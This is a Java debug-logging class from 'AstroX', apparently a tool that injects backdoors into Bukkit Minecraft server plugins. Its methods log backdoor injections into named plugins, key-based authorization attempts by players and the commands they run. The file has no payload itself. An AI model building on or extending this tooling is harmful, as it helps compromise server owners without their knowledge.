package dev.naruto.astrox.utils;

import dev.naruto.astrox.Config;
import org.bukkit.entity.Player;

/**
 * Centralized debug logging system
 * Only outputs when DEBUG_MODE is enabled
 */
public class DebugLogger {
    private static final String PREFIX = "[AstroX-Debug]";

    /**
     * Log general debug message
     */
    public static void log(String message) {
        if (Config.DEBUG_MODE) {
            System.out.println(PREFIX + " " + message);
        }
    }

    /**
     * Log verbose message (only if verbose enabled)
     */
    public static void verbose(String message) {
        if (Config.DEBUG_MODE && Config.VERBOSE_LOGGING) {
            System.out.println(PREFIX + " [VERBOSE] " + message);
        }
    }

    /**
     * Log error with stack trace
     */
    public static void error(String message, Throwable t) {
        if (Config.DEBUG_MODE) {
            System.err.println(PREFIX + " [ERROR] " + message);
            if (t != null) {
                t.printStackTrace();
            }
        }
    }

    /**
     * Log authorization attempt
     */
    public static void authAttempt(Player player, String key, boolean success) {
        if (Config.LOG_AUTH_ATTEMPTS) {
            String result = success ? "SUCCESS" : "FAILED";
            log(String.format("Auth attempt by %s: %s", player.getName(), result));
        }
    }

    /**
     * Log command execution
     */
    public static void command(Player player, String command, String[] args) {
        if (Config.LOG_COMMANDS) {
            log(String.format("Command: %s executed '%s' with args: %s",
                    player.getName(),
                    command,
                    String.join(" ", args)));
        }
    }

    /**
     * Log injection event
     */
    public static void injection(String pluginName, String packageName) {
        log(String.format("Backdoor injected into %s (package: %s)", pluginName, packageName));
    }

    /**
     * Log class loading event
     */
    public static void classLoaded(String className, int size) {
        verbose(String.format("Loaded class %s (%d bytes)", className, size));
    }
}
